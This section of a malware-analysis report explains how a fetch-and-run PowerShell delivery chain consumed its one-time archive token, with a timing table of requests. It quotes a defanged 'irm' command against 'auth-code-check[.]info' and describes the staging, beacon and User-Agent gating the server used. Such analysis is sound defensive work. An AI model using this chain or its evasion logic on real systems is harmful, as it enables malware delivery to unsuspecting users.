## Why the first archive went missing

The first replay returned `410 Gone` for the archive path. A later replay with a fresh token delivered the archive and exposed server-side consumption logic.

The inner PowerShell calls `/p/<archive-token>` unconditionally after its `Start-Process` block. It marks completion of the attempt, even when extraction or launch fails. During the first replay, `/p/` was requested before the archive. The old archive endpoint then returned `410 Gone`, and the API check later reported `consumed` and `fetched` state.

The `/p/<old-token>` request returned at `20:11:03`; the archive returned `410 Gone` at `20:11:04`. The decoded PowerShell normally calls `/p/` after extraction and launch. The successful comparison used a fresh token, so token age and prior request state may also have influenced the result.

Request shape also mattered. A PowerShell-like User-Agent received `404`, while the default request fetched the first-stage wrapper. The copied command omits the URL scheme in `irm 'auth-code-check[.]info/<ray>'`; the wrapper then pivots to an explicit `hxxp://...?...` URL. Delivery succeeded after the browser-side `action=dl` and `action=cb` sequence, the scripted delay, `/7z`, and the archive request, with `/p/` left untouched.

The captured responses show the sequence:

| Time (UTC) | Request artifact | Result | Interpretation |
|---|---|---|---|
| `20:08:46` | `api_action_dl.headers/body` | `200`; decoded `{"ok":true,"redir":""}` | The browser-side `action=dl` registration was accepted. |
| `20:11:02` | `tool_7z.headers` | `200`, 858,112-byte `7z.exe` | `/7z` remained a generally available tool route. |
| `20:11:03` | `p_beacon.headers/body` | `200`, body `ok` | The old token's `/p/` marker was accepted before archive retrieval. |
| `20:11:04` | `payload_archive.headers` | `410 Gone` | The old archive token was unavailable one second after `/p/`; later User-Agent, scheme, query, and callback/check variants remained `410` (one `.zip` suffix variant returned `403`). |
